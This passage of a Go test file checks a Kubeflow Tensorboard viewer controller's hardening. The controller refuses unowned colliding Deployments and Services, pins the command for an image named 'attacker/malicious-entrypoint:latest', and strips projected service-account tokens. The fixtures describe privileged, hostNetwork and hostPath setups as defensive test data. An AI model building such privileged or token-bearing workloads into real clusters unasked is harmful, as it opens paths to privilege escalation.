	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	// Reconcile must refuse rather than publish a route to an unowned workload.
	if _, err := reconciler.Reconcile(context.Background(), req); err == nil {
		t.Fatalf("Reconcile(%+v) = nil error; want an error for the unowned colliding deployment", req)
	}

	got := getDeployments(t, cli)
	if len(got) != 1 {
		t.Fatalf("Got %d deployments; want 1", len(got))
	}
	spec := got[0].Spec.Template.Spec
	// The unrelated deployment must be left exactly as it was.
	if !spec.HostNetwork {
		t.Errorf("unowned colliding deployment was mutated: hostNetwork cleared")
	}
	if spec.ServiceAccountName != "privileged-sa" {
		t.Errorf("unowned colliding deployment was mutated: serviceAccountName=%q", spec.ServiceAccountName)
	}
	if len(spec.Volumes) != 1 || spec.Volumes[0].HostPath == nil {
		t.Errorf("unowned colliding deployment was mutated: host-path volume removed")
	}
	if sc := spec.Containers[0].SecurityContext; sc == nil || sc.Privileged == nil || !*sc.Privileged {
		t.Errorf("unowned colliding deployment was mutated: privileged cleared")
	}
	if spec.Containers[0].Ports[0].HostPort != 8443 {
		t.Errorf("unowned colliding deployment was mutated: host port cleared")
	}
	// No Service/route may be published for the unowned deployment.
	if svcs := getServices(t, cli); len(svcs) != 0 {
		t.Errorf("a Service was published for an unowned colliding deployment: %+v", svcs)
	}
}

func TestReconcile_PinsTensorboardCommandForCustomImage(t *testing.T) {
	// A caller-chosen image must not be able to run its own entrypoint: the
	// controller pins the container command to tensorboard regardless.
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: "attacker/malicious-entrypoint:latest",
			},
		},
	}

	cli := fake.NewFakeClient(viewer)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	if _, err := reconciler.Reconcile(context.Background(), req); err != nil {
		t.Fatalf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	got := getDeployments(t, cli)
	c := got[0].Spec.Template.Spec.Containers[0]
	if c.Image != "attacker/malicious-entrypoint:latest" {
		t.Errorf("image unexpectedly changed: %q", c.Image)
	}
	if len(c.Command) != 1 || c.Command[0] != "tensorboard" {
		t.Errorf("command not pinned to tensorboard for custom image: %+v", c.Command)
	}
	if len(c.Args) == 0 || c.Args[0] == "tensorboard" {
		t.Errorf("args should not carry a leading tensorboard entry: %+v", c.Args)
	}
}

func TestReconcile_RefusesUnownedCollidingService(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
		},
	}

	// A pre-existing Service whose name collides with the derived viewer service
	// name but which is NOT owned by the Viewer. The controller must refuse to
	// publish a route through an unrelated Service.
	unownedSvc := &corev1.Service{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123-service",
			Namespace: "kubeflow",
			Annotations: map[string]string{
				"getambassador.io/config": "unrelated-mapping",
			},
		},
		Spec: corev1.ServiceSpec{
			Selector: map[string]string{"app": "unrelated"},
			Ports: []corev1.ServicePort{
				{Name: "http", Port: 80, TargetPort: intstr.IntOrString{IntVal: 9999}},
			},
		},
	}

	cli := fake.NewFakeClient(viewer, unownedSvc)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	if _, err := reconciler.Reconcile(context.Background(), req); err == nil {
		t.Fatalf("Reconcile(%+v) = nil error; want an error for the unowned colliding service", req)
	}

	// The unrelated Service must be left exactly as it was.
	svcs := getServices(t, cli)
	if len(svcs) != 1 {
		t.Fatalf("Got %d services; want 1", len(svcs))
	}
	got := svcs[0]
	if got.Annotations["getambassador.io/config"] != "unrelated-mapping" {
		t.Errorf("unowned service annotation was mutated: %q", got.Annotations["getambassador.io/config"])
	}
	if got.Spec.Selector["app"] != "unrelated" {
		t.Errorf("unowned service selector was mutated: %+v", got.Spec.Selector)
	}
}

func TestReconcile_DropsProjectedServiceAccountToken(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
			PodTemplateSpec: corev1.PodTemplateSpec{
				Spec: corev1.PodSpec{
					Containers: []corev1.Container{{
						VolumeMounts: []corev1.VolumeMount{
							{Name: "token-only", MountPath: "/var/run/secrets/tokens"},
							{Name: "mixed", MountPath: "/etc/mixed"},
						},
					}},
					Volumes: []corev1.Volume{
						{
							// Only a SA-token source: the whole volume must be dropped.
							Name: "token-only",
							VolumeSource: corev1.VolumeSource{
								Projected: &corev1.ProjectedVolumeSource{
									Sources: []corev1.VolumeProjection{
										{ServiceAccountToken: &corev1.ServiceAccountTokenProjection{Path: "token"}},
									},
								},
							},
						},
						{
							// Token source alongside a configMap: the token source is
							// stripped but the volume (and its configMap) is kept.
							Name: "mixed",
							VolumeSource: corev1.VolumeSource{
								Projected: &corev1.ProjectedVolumeSource{
									Sources: []corev1.VolumeProjection{
										{ServiceAccountToken: &corev1.ServiceAccountTokenProjection{Path: "token"}},
										{ConfigMap: &corev1.ConfigMapProjection{
											LocalObjectReference: corev1.LocalObjectReference{Name: "cfg"},
										}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	cli := fake.NewFakeClient(viewer)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})
	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	if _, err := reconciler.Reconcile(context.Background(), req); err != nil {
		t.Fatalf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	spec := getDeployments(t, cli)[0].Spec.Template.Spec
	byName := map[string]corev1.Volume{}
	for _, v := range spec.Volumes {
		byName[v.Name] = v
	}
	if _, ok := byName["token-only"]; ok {
		t.Errorf("token-only projected volume was not dropped: %+v", spec.Volumes)
	}
	mixed, ok := byName["mixed"]
	if !ok {
		t.Fatalf("mixed projected volume was unexpectedly dropped: %+v", spec.Volumes)
	}
	for _, s := range mixed.Projected.Sources {
		if s.ServiceAccountToken != nil {
			t.Errorf("service-account-token source was not stripped from the mixed volume")
		}
	}
	if len(mixed.Projected.Sources) != 1 || mixed.Projected.Sources[0].ConfigMap == nil {
		t.Errorf("mixed projected volume should retain only its configMap source: %+v", mixed.Projected.Sources)
	}
	for _, m := range spec.Containers[0].VolumeMounts {
		if m.Name == "token-only" {
			t.Errorf("mount for the dropped token-only volume was not removed")
		}
	}
}
